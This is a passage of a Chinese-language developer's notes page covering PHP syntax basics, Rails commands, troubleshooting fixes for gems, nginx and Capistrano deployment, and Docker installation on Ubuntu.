class="line">解决中文输出乱码：</span><br><span class="line">    <span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这就是PHP的标识</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"This is PHP that can be run on Server"</span>; <span class="meta">?&gt;</span></span><br><span class="line">                </span><br><span class="line"><span class="comment">// 字符串</span></span><br><span class="line">需要用 <span class="string">" "</span>, <span class="string">' '</span>, Heredoc?都可以...</span><br><span class="line"><span class="string">" "</span>中出现变量的时候，变量会自动和双引号的内容连在一起</span><br><span class="line">$a .= $b   <span class="comment">// 将b字符串加到a右边</span></span><br><span class="line">当字符串很长的时候，使用Heredoc结构</span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">    $string1 = <span class="string">&lt;&lt;&lt;GOD</span></span><br><span class="line"><span class="string">    我有一只小毛驴，我从来也不骑。</span></span><br><span class="line"><span class="string">    有一天我心血来潮，骑着去赶集。</span></span><br><span class="line"><span class="string">    我手里拿着小皮鞭，我心里正得意。</span></span><br><span class="line"><span class="string">    不知怎么哗啦啦啦啦，我摔了一身泥.</span></span><br><span class="line"><span class="string">    GOD;</span></span><br><span class="line"><span class="string">    echo <span class="subst">$string1</span>;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">直接输出长字符串        </span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">     echo &lt;&lt;&lt;EOF// 这个EOF可以任意命名，与结尾处相同即可</span></span><br><span class="line"><span class="string">     &lt;h1&gt;哈哈哈哈&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;这是标题&lt;/p&gt;</span></span><br><span class="line"><span class="string">    EOF;</span></span><br><span class="line"><span class="string">// 结束需要独立一行且前后不能空格   </span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">     </span></span><br><span class="line"><span class="string">&lt;?php echo 12*3; ?&gt;</span></span><br><span class="line"><span class="string">&lt;?php echo "Hello, " . "PHP!"; ?&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// 变量</span></span><br><span class="line"><span class="string"><span class="subst">$var</span> = "This is a avarible"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var_dump(<span class="subst">$var</span>)  // 可输出变量类型</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">// 特殊类型——资源</span></span><br><span class="line"><span class="string">资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。我们可以对资源进行操作（创建、使用和释放）。任何资源再不需要的时候应该被及时释放。如果我们忘记释放资源，系统自动启动垃圾回收机制，在页面执行完毕后回收资源，以免内存被消耗殆尽。</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">//首先采用“fopen”函数打开文件，得到返回值的就是资源类型。</span></span><br><span class="line"><span class="string"><span class="subst">$file_handle</span> = fopen("D:\\i.txt", "r");</span></span><br><span class="line"><span class="string">if (<span class="subst">$file_handle</span>)&#123;</span></span><br><span class="line"><span class="string">    //接着采用while循环一行行地读取文件，然后输出每行的文字</span></span><br><span class="line"><span class="string">    while (!feof(<span class="subst">$file_handle</span>)) &#123; //判断是否到最后一行</span></span><br><span class="line"><span class="string">        <span class="subst">$line</span> = fgets(<span class="subst">$file_handle</span>); //读取一行文本</span></span><br><span class="line"><span class="string">        echo <span class="subst">$line</span>; //输出一行文本</span></span><br><span class="line"><span class="string">        echo "&lt;br /&gt;"; //换行</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">fclose(<span class="subst">$file_handle</span>);//关闭文件</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// 特殊类型——NULL</span></span><br><span class="line"><span class="string">NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值时，或者被unset()，在这三种情况下变量被认为是NULL。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// 常量</span></span><br><span class="line"><span class="string">自定义常量</span></span><br><span class="line"><span class="string">bool define(string <span class="subst">$constant_name</span>, mixed<span class="subst">$value</span>[, <span class="subst">$case_sensitive</span> = true])// 大小写敏感</span></span><br><span class="line"><span class="string">define("PI",3.14);</span></span><br><span class="line"><span class="string"><span class="subst">$p</span> = "PII";</span></span><br><span class="line"><span class="string">define(<span class="subst">$p</span>,3.14);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">系统常量</span></span><br><span class="line"><span class="string">系统常量是PHP已经定义好的常量，我们直接拿来使用</span></span><br><span class="line"><span class="string">__FILE__:PHP程序文件名。它可以帮助我们获取当前文件在服务器的物理位置。</span></span><br><span class="line"><span class="string">__LINE__:PHP程序文件行数。它可以告诉我们，当前代码在第几行。</span></span><br><span class="line"><span class="string">__DIR__:文件所在目录</span></span><br><span class="line"><span class="string">PHP_VERSOIN:当前解析器的版本号。</span></span><br><span class="line"><span class="string">PHP_OS:执行当前PHP版本的操作系统名称。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 如何获得常量的值呢？</span></span><br><span class="line"><span class="string">    1.直接使用常量名，如 PI、PII</span></span><br><span class="line"><span class="string">    2.使用constant()函数，如 constant("PI")</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// 如何判定常量是否被定义？</span></span><br><span class="line"><span class="string">    使用defined()函数，其返回值为bool。如 defined(PI)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// 引用</span></span><br><span class="line"><span class="string"><span class="subst">$b</span> = <span class="subst">$a</span>;</span></span><br><span class="line"><span class="string"><span class="subst">$c</span> = &amp;<span class="subst">$a</span>;// c为a的引用，两变量共享一块内存</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 比较运算符</span></span><br><span class="line"><span class="string">==等于则TRUE</span></span><br><span class="line"><span class="string">    !=  &lt;&gt;不等则TRUE</span></span><br><span class="line"><span class="string">    ===相等且类型相同才TRUE</span></span><br><span class="line"><span class="string">    !==非全等，不相等或类型不同则TRUE</span></span><br><span class="line"><span class="string">     &lt;&gt;&lt;= &gt;=</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// 三元运算符与c同</span></span><br><span class="line"><span class="string"><span class="subst">$a</span> = 78;</span></span><br><span class="line"><span class="string"><span class="subst">$b</span> = <span class="subst">$a</span> &gt;= 60 ? "及格" : "不及格"；</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">// 逻辑运算符</span></span><br><span class="line"><span class="string">     andor    xor    ! &amp;&amp;   ||</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">// 错误控制运算符——“@”</span></span><br><span class="line"><span class="string">对于一些可能会在运行过程中出错的表达式，我们不希望出错的时候给用户显示这些错误信息。</span></span><br><span class="line"><span class="string">于是，可以将@放置在一个PHP表达式之前，该表达式的坑产生的任何错误信息都被忽略掉</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-type:text/html;charset=utf-8");</span></span><br><span class="line"><span class="string">    <span class="subst">$conn</span> = @mysqli_connect("localhost", "username", "passwd");</span></span><br><span class="line"><span class="string">    echo "出错了，错误信息是：" . <span class="subst">$php_errormsg</span>;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"><span class="subst">$num</span> = rand(1,50); // 获取1至50的随机数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// foreach()</span></span><br><span class="line"><span class="string">foreach(数组 as 值)foreach(数组 as 下标 =&gt; 值)</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-type:text/html;charset=utf-8");</span></span><br><span class="line"><span class="string"><span class="subst">$students</span> = array(</span></span><br><span class="line"><span class="string">    '2010'=&gt;'令狐冲',</span></span><br><span class="line"><span class="string">    '2011'=&gt;'林平之',</span></span><br><span class="line"><span class="string">    '2012'=&gt;'曲洋',</span></span><br><span class="line"><span class="string">    '2013'=&gt;'任盈盈',</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foreach (<span class="subst">$students</span> as <span class="subst">$v</span>)&#123;</span></span><br><span class="line"><span class="string">    echo <span class="subst">$v</span>;//输出（打印）姓名</span></span><br><span class="line"><span class="string">    echo "&lt;br /&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foreach (<span class="subst">$students</span> as <span class="subst">$key</span> =&gt; <span class="subst">$v</span>)&#123;</span></span><br><span class="line"><span class="string">    echo <span class="subst">$key</span> . <span class="subst">$v</span>;</span></span><br><span class="line"><span class="string">    echo "&lt;br /&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">// 数组</span></span><br><span class="line"><span class="string">    1.数值数组-带有数字 ID 键的数组</span></span><br><span class="line"><span class="string">    <span class="subst">$cars</span> = array("Volvo","BMW","Toyota");  // 自动分配 ID 键（0开始）</span></span><br><span class="line"><span class="string">获取数组长度——count(<span class="subst">$cars</span>)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    2.关联数组-带有指定的键的数组，每个键关联一个值（dict）</span></span><br><span class="line"><span class="string">    <span class="subst">$age</span>=array("Peter"=&gt;"35","Ben"=&gt;"37","Joe"=&gt;"43");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    3.多维数组-包含一个或多个数组的数组</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// 函数</span></span><br><span class="line"><span class="string">function functionName(<span class="subst">$arg1</span>, <span class="subst">$arg2</span>)&#123;return;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">True</span>);  <span class="comment">// 为 php.ini 中的选项值设置初始值</span></span><br><span class="line">ini_get(<span class="string">'display_error'</span>);        <span class="comment">// 取值</span></span><br><span class="line"><span class="keyword">exit</span>(status)  <span class="comment">// 输出一条消息，并退出当前脚本，与下同</span></span><br><span class="line"><span class="keyword">die</span>(status)   <span class="comment">// exit() 的别名，若status为字符串，则该函数会在退出前输出字符串，若为整数，这个值将会做退出状态。0为正常终止。</span></span><br><span class="line"><span class="keyword">eval</span>(phpcode)  <span class="comment">// 把字符串作为PHP代码运行</span></span><br><span class="line">trim(string(,char))  <span class="comment">// 移除字符串两侧的空白字符或指定字符</span></span><br><span class="line">addslashes(string)  <span class="comment">// 为string中的 ',",\,NULL添加'\'</span></span><br><span class="line">is_string($var)  <span class="comment">// 检测变量是否为字符串</span></span><br><span class="line">strval(mixed $var)  <span class="comment">// 返回var的字符串</span></span><br><span class="line">strrev(str)  <span class="comment">// 反转字符串</span></span><br><span class="line">var_dump(<span class="keyword">var</span>)  <span class="comment">// 打印变量的相关信息</span></span><br><span class="line">show_source()  <span class="comment">// 对文件进行语法高亮显示</span></span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];  <span class="comment">// 抑制报错信息的显示</span></span><br></pre></td></tr></table></figure><h2 id="Ruby-on-rails"><a href="#Ruby-on-rails" class="headerlink" title="Ruby on rails"></a>Ruby on rails</h2><p>Rails框架的主要结构是MVC(Model-View-Controller)</p><p><code>MVC</code>的几点理解：</p><ol><li><p><em>MVC</em>最重要的是模型<em>Model</em>，业务逻辑写在<em>Model</em>里</p></li><li><p>控制器<em>Controller</em>里面越少越好，业务逻辑不要写在控制器里</p></li><li><p><em>View</em>是可以看到的东西</p></li></ol><p><code>MVC</code>的终极目标：</p><blockquote><p>将软件用户界面和业务逻辑分离，以使代码可扩展性，可复用性，可维护性，灵活性加强</p></blockquote><p>现实中的 <em>Web</em> 应用：</p><ol><li><em>Model</em> 层是数据库访问层</li><li><em>View</em> 层是 <em>web</em> 展示的样子</li><li><em>Controller</em> 层写的是业务逻辑</li></ol><p><strong><em>scaffold</em>生成<em>User</em>数据模型</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rails generate scaffold User name:string email:string</span></span><br></pre></td></tr></table></figure><p><strong>撤销generate操作</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rails generate controller StaticPages home <span class="built_in">help</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> rails destroy  controller StaticPages home <span class="built_in">help</span></span></span><br></pre></td></tr></table></figure><p><strong>迁移数据库</strong>——使用新的数据模型更新数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rails db:migrate</span><br></pre></td></tr></table></figure><p><strong>撤销迁移</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rails db:rollback</span></span><br></pre></td></tr></table></figure><p><strong>回滚到最初状态</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rails db:migrate VERSION=0  <span class="comment"># 最后一个数字为版本号</span></span></span><br></pre></td></tr></table></figure><p><strong>撤销generate操作</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rails generate controller StaticPages home <span class="built_in">help</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> rails destroy  controller StaticPages home <span class="built_in">help</span></span></span><br></pre></td></tr></table></figure><p><strong>常用命令</strong></p><table><thead><tr><th>完整形式</th><th>简写形式</th></tr></thead><tbody><tr><td><code>$ rails server</code></td><td><code>$ rails s</code></td></tr><tr><td><code>$ rails console</code></td><td><code>$ rails c</code></td></tr><tr><td><code>$ rails generate</code></td><td><code>$ rails g</code></td></tr><tr><td><code>$ rails test</code></td><td><code>$ rails t</code></td></tr><tr><td><code>$ bundle install</code></td><td><code>$ bundle</code></td></tr></tbody></table><h2 id="开发中的小问题"><a href="#开发中的小问题" class="headerlink" title="开发中的小问题"></a>开发中的小问题</h2><ul><li><p>U 盘格式化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">diskpart</span><br><span class="line">lis dis</span><br><span class="line">sel dis ID</span><br><span class="line">clean</span><br><span class="line">create partition primary</span><br><span class="line">active</span><br><span class="line">format fs=fat32 quick</span><br></pre></td></tr></table></figure></li><li><p>sudo echo &gt; 权限不够</p><blockquote><p>  ➜  ~ sudo echo ‘</p><h1>Hello, Docker!</h1>‘  &gt; /var/www/html/test.html<br>  zsh: permission denied: /var/www/html/test.html<p></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">原因：sudo只是让echo命令具有root权限，&gt; 没有</span><br><span class="line"><span class="meta">#</span><span class="bash"> sh -c 将字符串作为完整命令来执行</span></span><br><span class="line">sudo sh -c "echo &gt;"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 利用管道和tee命令，该命令可从标准输入中读入信息并将其写入标准输出或文件中</span></span><br><span class="line">echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' | sudo tee /test.html</span><br><span class="line">echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' | sudo tee -a /test.html  # -a 为追加</span><br></pre></td></tr></table></figure></li><li><p>.swp 文件恢复</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">假设你的swp文件叫'.m.php.swp'</span><br><span class="line">可用带-r参数编辑</span><br><span class="line"><span class="meta">#</span><span class="bash">vi -r m.php</span></span><br><span class="line">然后wq保存即可</span><br><span class="line"></span><br><span class="line">或者使用:</span><br><span class="line"><span class="meta">#</span><span class="bash">vi  .m.php.swp</span></span><br><span class="line">然后:recover</span><br><span class="line">最后wq保存</span><br></pre></td></tr></table></figure><ul><li>VM 共享文件夹</li></ul><blockquote><p>  常规操作后，/mnt 目录下无 hgfs 文件夹，暂时没有解决：</p><ul><li>在 kali 上 open-tools 之类的都显示定位失败</li><li>直接挂载还是啥都没有</li></ul></blockquote><p><strong>解决办法：</strong>重装vm-tools，一路回车，不用管</p><h3 id="PHP-中文输出乱码"><a href="#PHP-中文输出乱码" class="headerlink" title="PHP 中文输出乱码"></a>PHP 中文输出乱码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">一、HTML页面编码设置 </span><br><span class="line"><span class="number">1.</span>在head标签里面加入这句</span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;metahttp-equiv=<span class="string">"Content-Type"</span>content=<span class="string">"text/html; charset=UTF-8"</span>/&gt;  </span><br><span class="line">&lt;/head&gt; </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>文件保存时设置编码UTF<span class="number">-8</span></span><br><span class="line">    </span><br><span class="line">二、PHP编码设置 </span><br><span class="line">在方法一的基础上在php代码时最前面即第一句写上</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">三、Mysql编码设置 </span><br><span class="line">在前面的基础上，还要在你的数据查询/修改/增加之前加入数据库编码。</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">mysql_query(<span class="string">'SET NAMES UTF8'</span>);     </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="rails-new-lmzdx-d-mysql-报错"><a href="#rails-new-lmzdx-d-mysql-报错" class="headerlink" title="rails new lmzdx -d mysql* 报错"></a>rails new lmzdx -d mysql* 报错</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">An error occurred while installing mysql2 (0.5.2), and Bundler cannot</span><br><span class="line">continue.</span><br><span class="line">Make sure that `gem install mysql2 -v '0.5.2' --source 'https://rubygems.org/'`</span><br><span class="line">succeeds before bundling.</span><br><span class="line"></span><br><span class="line">In Gemfile:</span><br><span class="line">  mysql2</span><br><span class="line">         run  bundle exec spring binstub --all</span><br><span class="line">bundler: command not found: spring</span><br><span class="line">Install missing gem executables with `bundle install`</span><br></pre></td></tr></table></figure><p><strong>Solution</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">I think you missing dev library of mysql:</span><br><span class="line">On ubuntu:</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libmysqlclient-dev</span></span><br><span class="line"></span><br><span class="line">On Red Hat/CentOS and other distributions using yum:</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo yum install mysql-devel</span></span><br><span class="line"></span><br><span class="line">On Mac OS X with Homebrew:</span><br><span class="line"><span class="meta">$</span><span class="bash"> brew install mysql</span></span><br></pre></td></tr></table></figure><p><strong>rails 新项目后运行cap install STAGES=production 报错</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">显示cap没有安装</span><br><span class="line">此时不要听Ubuntu的建议去使用apt安装</span><br><span class="line">重启终端即可</span><br></pre></td></tr></table></figure><h3 id="TZInfo-DataSourceNotFound-tzinfo-data-is-not-present"><a href="#TZInfo-DataSourceNotFound-tzinfo-data-is-not-present" class="headerlink" title="TZInfo::DataSourceNotFound: tzinfo-data is not present."></a><em>TZInfo::DataSourceNotFound: tzinfo-data is not present.</em></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01 rake aborted!</span><br><span class="line">01 TZInfo::DataSourceNotFound: tzinfo-data is not present.</span><br></pre></td></tr></table></figure><p><strong>Solution</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run gem install tzinfo-data </span><br><span class="line">or add gem 'tzinfo-data' to your Gemfile and run bundle install</span><br><span class="line">直接gem安装可能会报错，说什么找不到，此时可以先 bundle update &amp;&amp; bundle install</span><br><span class="line">最重要的一步来了 git push</span><br><span class="line">服务器是直接去GitHub上取代码，如果不同步给GitHub，仍然会报老错误</span><br></pre></td></tr></table></figure><h3 id="nginx-配置-etc-nginx-sites-enabled-default-时挂掉"><a href="#nginx-配置-etc-nginx-sites-enabled-default-时挂掉" class="headerlink" title="nginx 配置 /etc/nginx/sites-enabled/default 时挂掉"></a>nginx 配置 /etc/nginx/sites-enabled/default 时挂掉</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果备份文件与配置文件就放在同一目录时，备份文件需要以.开头，</span><br><span class="line">否则会与配置文件冲突，导致nginx挂掉（并非以文件名来识别）</span><br></pre></td></tr></table></figure><h3 id="capistrano-信息"><a href="#capistrano-信息" class="headerlink" title="capistrano 信息"></a>capistrano 信息</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">================= Release notes <span class="keyword">for</span> capistrano-passenger ===========================</span><br><span class="line">passenger once had only one way to restart: `touch tmp/restart.txt`</span><br><span class="line">Beginning with passenger v4<span class="number">.0</span><span class="number">.33</span>, a <span class="keyword">new</span> way was introduced: `passenger-config restart-app`</span><br><span class="line"></span><br><span class="line">The <span class="keyword">new</span> way to restart was <span class="keyword">not</span> initially practical <span class="keyword">for</span> everyone,</span><br><span class="line">since <span class="keyword">for</span> versions of passenger prior to v5<span class="number">.0</span><span class="number">.10</span>,</span><br><span class="line">it required your deployment user to have sudo access <span class="keyword">for</span> some server configurations.</span><br><span class="line"></span><br><span class="line">capistrano-passenger gives you the flexibility to choose your restart approach, <span class="keyword">or</span> to rely on reasonable defaults.</span><br><span class="line"></span><br><span class="line">If you want to restart <span class="keyword">using</span> `touch tmp/restart.txt`, add <span class="keyword">this</span> to your config/deploy.rb:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> :passenger_restart_with_touch, <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">If you want to restart <span class="keyword">using</span> `passenger-config restart-app`, add <span class="keyword">this</span> to your config/deploy.rb:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> :passenger_restart_with_touch, <span class="literal">false</span> # Note that `nil` is NOT the same as `<span class="literal">false</span>` here</span><br><span class="line"></span><br><span class="line">If you don't <span class="built_in">set</span> `:passenger_restart_with_touch`, capistrano-passenger will check what version of passenger you are running</span><br><span class="line"><span class="keyword">and</span> use `passenger-config restart-app` <span class="keyword">if</span> it is available in that version.</span><br><span class="line"></span><br><span class="line">If you are running passenger in standalone mode, it is possible <span class="keyword">for</span> you to put passenger in your</span><br><span class="line">Gemfile <span class="keyword">and</span> rely on capistrano-bundler to install it with the rest of your bundle.</span><br><span class="line">If you are installing passenger during your deployment AND you want to restart <span class="keyword">using</span> `passenger-config restart-app`,</span><br><span class="line">you need to <span class="built_in">set</span> `:passenger_in_gemfile` to `<span class="literal">true</span>` in your `config/deploy.rb`.</span><br><span class="line">====================================================================================</span><br></pre></td></tr></table></figure><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库（Repository）</strong>；</p><p>每个仓库可以包含多个<strong>标签（Tag）</strong>；每个标签对应一个镜像。</p><p><code>镜像</code>和<code>容器</code>的关系，就像<code>类</code>与<code>对象</code></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 更新相关软件</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加Docker源</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">apt-cache policy docker-ce</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下面是安装信息：</span></span><br><span class="line">docker-ce:</span><br><span class="line">  Installed: (none)</span><br><span class="line">  Candidate: 18.06.1~ce~3-0~ubuntu</span><br><span class="line">  Version table:</span><br><span class="line">     18.06.1~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">     18.06.0~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">     18.03.1~ce~3-0~ubuntu 500</span><br><span class="line">        500 https://download.docker.com/linux/ubuntu bionic/stable amd64 Packages</span><br><span class="line">        </span><br><span class="line"><span class="meta">#</span><span class="bash"> 正式安装</span></span><br><span class="line">sudo apt install docker-ce</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看运行状态</span></span><br><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure><p><strong>基本使用</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 